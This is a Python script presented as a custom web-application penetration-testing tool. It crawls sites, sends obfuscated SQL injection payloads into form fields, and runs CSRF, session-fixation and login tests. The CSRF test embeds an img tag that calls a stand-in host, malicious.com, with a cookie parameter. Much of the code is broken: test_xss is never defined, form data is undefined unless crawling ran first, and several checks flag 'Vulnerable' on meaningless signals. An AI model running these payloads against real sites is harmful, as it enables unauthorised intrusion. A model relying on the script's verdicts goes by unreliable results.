######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################

import requests
from bs4 import BeautifulSoup
import urllib.parse
import base64
import random
import string
import csv
import time

# Banner
def print_banner():
    banner = r"""

 __      __        ___.        _____                  .__   .__                  __  .__                  _________                           .__   __            ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__     /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____    /   _____/ ____   ____   __ _________|__|_/  |_  ___.__. \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \   /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \   \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |  |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \ /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \  /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |  |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  / \____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  / /_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|  \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \/          \/|__|    |__|                   \/      \/                     \/          \/     \/     \/                          \/           \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     


  Web Application Security Framework - Custom Pen Testing Script
    """
    print(banner)

# Write the test results to a CSV file
def write_report(results, filename="test_results.csv"):
    with open(filename, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Test", "Status", "Details"])
        for result in results:
            writer.writerow(result)

# SQL Injection Obfuscation Payloads
def obfuscate_sql_payload(payload):
    obfuscations = [
        payload,
        payload.replace("'", "/*'*/"),
        payload.replace("'", "/*'*/'"),
        base64.b64encode(payload.encode()).decode(),
        urllib.parse.quote(payload),
        urllib.parse.quote_plus(payload)
    ]
    return random.choice(obfuscations)

# XSS Payload Obfuscation
def obfuscate_xss_payload(payload):
    obfuscations = [
        payload,
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        base64.b64encode(payload.encode()).decode(),
        urllib.parse.quote(payload)
    ]
    return random.choice(obfuscations)

# Crawl and Extract Forms (Same as before)
def crawl_and_extract_forms(url):
    results = []
    visited = set()  # To avoid revisiting the same URL
    to_visit = [url]
    
    while to_visit:
        current_url = to_visit.pop()
        if current_url in visited:
            continue
        visited.add(current_url)
        
        try:
            response = requests.get(current_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms and hidden fields
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                hidden_fields = form.find_all('input', {'type': 'hidden'})
                hidden_data = {field.get('name', ''): field.get('value', '') for field in hidden_fields}
                results.append({"url": current_url, "action": action, "method": method, "hidden_fields": hidden_data})

            # Find all links (anchor tags) and add them to the to_visit list
            links = soup.find_all('a', href=True)
            for link in links:
                link_url = urllib.parse.urljoin(url, link['href'])
                if link_url not in visited:
                    to_visit.append(link_url)
        except requests.RequestException as e:
            print(f"Error crawling {current_url}: {e}")
            
    return results

# SQL Injection Test with Obfuscation
def test_sql_injection(url, forms):
    payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL, NULL --"]
    results = []
    
    for form in forms:
        form_url = urllib.parse.urljoin(url, form['action'])
        method = form['method']
        hidden_fields = form['hidden_fields']
        
        # Create the payload data with obfuscation
        for payload in payloads:
            obfuscated_payload = obfuscate_sql_payload(payload)
            data = hidden_fields.copy()
            for key in data:
                data[key] = obfuscated_payload
            
            if method == 'post':
                response = requests.post(form_url, data=data)
            else:
                response = requests.get(form_url, params=data)

            if "error" in response.text or "syntax" in response.text:
                results.append((f"SQL Injection Test on {form_url}", "Vulnerable", "Possible SQL Injection"))
            else:
                results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", "No SQL Injection"))
    return results

# CSRF Test
def test_csrf(url, forms):
    payload = "<img src='http://malicious.com/csrf?cookie=" + "dummycookie" + "' />"
    results = []
    
    for form in forms:
        form_url = urllib.parse.urljoin(url, form['action'])
        method = form['method']
        hidden_fields = form['hidden_fields']
        
        # Create the CSRF payload
        data = hidden_fields.copy()
        data['csrf_token'] = payload  # Adjust this for real token fields
        
        if method == 'post':
            response = requests.post(form_url, data=data)
        else:
            response = requests.get(form_url, params=data)
                
        if "error" in response.text:
            results.append((f"CSRF Test on {form_url}", "Vulnerable", "CSRF vulnerability detected"))
        else:
            results.append((f"CSRF Test on {form_url}", "Not Vulnerable", "No CSRF"))
    return results

# Session Fixation Test
def test_session_fixation(url):
    session = requests.Session()
    response = session.get(url)
    
    # Attempt to fix the session
    cookies = session.cookies.get_dict()
    fixed_cookie = cookies.get('sessionid', None)
    
    if fixed_cookie:
        results = [("Session Fixation", "Vulnerable", "Session ID can be fixed")]
    else:
        results = [("Session Fixation", "Not Vulnerable", "Session ID is secure")]
    
    return results

# Login Function (Handling Different Auth Types)
def login(url, username, password, is_admin=False):
    login_url = urllib.parse.urljoin(url, '/login')  # Adjust for your app's login URL
    data = {
        'username': username,
        'password': password
    }
    
    session = requests.Session()
    response = session.post(login_url, data=data)
    
    if response.ok:
        print(f"Logged in as {'admin' if is_admin else 'standard user'}")
        return session
    else:
        print(f"Failed to login as {'admin' if is_admin else 'standard user'}")
        return None

# Main menu and user input (Same as before)
def main_menu():
    print_banner()
    while True:
        print("\nSelect a Test to Run:")
        print("[1] Crawl Website and Extract Forms")
        print("[2] SQL Injection Test with Obfuscation")
        print("[3] XSS Test with Obfuscation")
        print("[4] Test CSRF Vulnerability")
        print("[5] Test Session Fixation")
        print("[6] Test Authenticated Access (Admin User)")
        print("[7] Test Authenticated Access (Standard User)")
        print("[8] Exit")
        
        choice = input("Select an option (1-8): ")
        
        if choice == '1':
            url = input("Enter URL to crawl and extract forms: ")
            forms = crawl_and_extract_forms(url)
            write_report([("Form Extraction", "Completed", "Forms extracted")])
            print("Form Extraction Completed. Results saved to test_results.csv.")
        elif choice == '2':
            url = input("Enter URL to test for SQL Injection: ")
            results = test_sql_injection(url, forms)
            write_report(results)
            print("SQL Injection Test Completed. Results saved to test_results.csv.")
        elif choice == '3':
            url = input("Enter URL to test for XSS: ")
            results = test_xss(url, forms)  # Implement XSS tests here
            write_report(results)
            print("XSS Test Completed. Results saved to test_results.csv.")
        elif choice == '4':
            url = input("Enter URL to test for CSRF: ")
            results = test_csrf(url, forms)
            write_report(results)
            print("CSRF Test Completed. Results saved to test_results.csv.")
        elif choice == '5':
            url = input("Enter URL to test for Session Fixation: ")
            results = test_session_fixation(url)
            write_report(results)
            print("Session Fixation Test Completed. Results saved to test_results.csv.")
        elif choice == '6':
            url = input("Enter URL to test as Admin User: ")
            username = input("Enter admin username: ")
            password = input("Enter admin password: ")
            session = login(url, username, password, is_admin=True)
            if session:
                print("Testing Admin User Access...")
                # Admin-specific testing (add your tests)
        elif choice == '7':
            url = input("Enter URL to test as Standard User: ")
            username = input("Enter standard username: ")
            password = input("Enter standard password: ")
            session = login(url, username, password, is_admin=False)
            if session:
                print("Testing Standard User Access...")
                # Standard user-specific testing
        elif choice == '8':
            break
        else:
            print("Invalid option. Please choose a valid option (1-8).")

# Run the main menu
if __name__ == "__main__":
    main_menu()
